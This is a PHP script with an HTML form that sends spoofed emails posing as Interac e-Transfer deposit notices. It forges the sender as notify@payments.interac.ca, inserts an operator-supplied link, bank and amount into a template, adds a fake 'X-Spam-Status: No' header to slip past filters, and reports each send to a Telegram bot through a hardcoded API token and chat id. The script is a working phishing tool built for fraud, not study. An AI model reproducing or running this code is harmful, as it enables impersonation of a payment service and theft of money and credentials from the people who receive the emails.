<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require("PHPMailer/src/PHPMailer.php");
require("PHPMailer/src/SMTP.php");
require("PHPMailer/src/Exception.php");

$receiver_email = $_POST['receiver_email'];
$sender_email = 'notify@payments.interac.ca';
$email_subject = 'INTERAC e-Transfer: ' . $_POST['sender_name'] . ' sent you money.';

// Set email message
$template = file_get_contents('Deposit.html');
$message = str_replace('{{expiredate}}', $_POST['expiredate'], $template);
$message = str_replace('{{username}}', $_POST['username'], $message);
$message = str_replace('{{phoreceiver_href}}', $_POST['phoreceiver_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{phoreceiver_link}}', $_POST['phoreceiver_link'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{expiredate}}', $_POST['expiredate'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receiver_name}}', $_POST['receiver_name'], $message);
$message = str_replace('{{receiver_email}}', $_POST['receiver_email'], $message);

// Set additional headers
$headers = array(
    'MIME-Version: 1.0',
    'Content-Type: text/html; charset=UTF-8',
    'X-Mailer: PHP/' . phpversion(),
    'From: ' . $sender_email,
    'Reply-receiver: ' . $sender_email,
    'Return-Path: ' . $sender_email,
    'X-Priority: 3',
    'X-Mailer: PHPMailer 5.2.27 (https://github.com/PHPMailer/PHPMailer)',
    'X-Originating-IP: ' . $_SERVER['SERVER_ADDR'],
    'X-Spam-Status: No'
);

// Send email with fake sender information
$mail = new PHPMailer();
$mail->IsSMTP();
$mail->SMTPSecure = 'tsl';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port'];
$mail->Body = $message; // use $message instead of $template
$mail->SMTPAuth = true;
$mail->Username = $_POST['username'];
$mail->Password = $_POST['password'];
$mail->SetFrom($sender_email, $_POST['sender_name']);
$mail->AddAddress($receiver_email);
$mail->Subject = $email_subject;
$mail->IsHTML(true);
$mail->CharSet = "utf-8";

if (!$mail->Send()) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}

$message ="INTERAC E-TRANSFER HAS BEEN SENT!";
$apitoken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-821080105',
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apitoken/sendMessage?" . http_build_query($data));




                                 ?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>PHPMailer HTML Form</title>
</head>
<body>

	<h1>PHPMailer HTML Form</h1>

	<form action="submit3.php" method="post">

		<label for="template">Template:</label>
		<select name="template" id="template">
			<option value="template1.html">Template 1</option>
			<option value="template2.html">Template 2</option>
			<option value="template3.html">Template 3</option>
		</select>
		<br><br>

		<label for="username">Username:</label>
		<input type="text" name="username" id="username">
		<br><br>

		<label for="photo_href">Photo Href:</label>
		<input type="text" name="photo_href" id="photo_href">
		<br><br>

		<label for="bank">Bank:</label>
		<input type="text" name="bank" id="bank">
		<br><br>

		<label for="amount">Amount:</label>
		<input type="text" name="amount" id="amount">
		<br><br>

		<label for="link">Link:</label>
		<input type="text" name="link" id="link">
		<br><br>

		<label for="EXPIRE">Expire:</label>
		<input type="text" name="EXPIRE" id="EXPIRE">
		<br><br>

		<label for="expiredate">Expire Date:</label>
		<input type="text" name="expiredate" id="expiredate">
		<br><br>

		<label for="photo_link">Photo Link:</label>
		<input type="text" name="photo_link" id="photo_link">
		<br><br>

		<label for="sender_name">Sender Name:</label>
		<input type="text" name="sender_name" id="sender_name">
		<br><br>

		<label for="receiver_name">Receiver Name:</label>
		<input type="text" name="receiver_name" id="receiver_name">
		<br><br>

		<label for="receiver_email">Receiver Email:</label>
		<input type="email" name="receiver_email" id="receiver_email">
		<br><br>

		<label for="host">Host:</label>
		<input type="text" name="host" id="host">
		<br><br>

		<label for="port">Port:</label>
		<input type="text" name="port" id="port">
		<br><br>

		<label for="username">Username:</label>
		<input type="text" name="username" id="username">
		<br><br>

		<label for="password">Password:</label>
		<input type="password" name="password" id="password">
		<br><br>

		<input type="submit" value="Send Email">

	</form>

</body>
</html>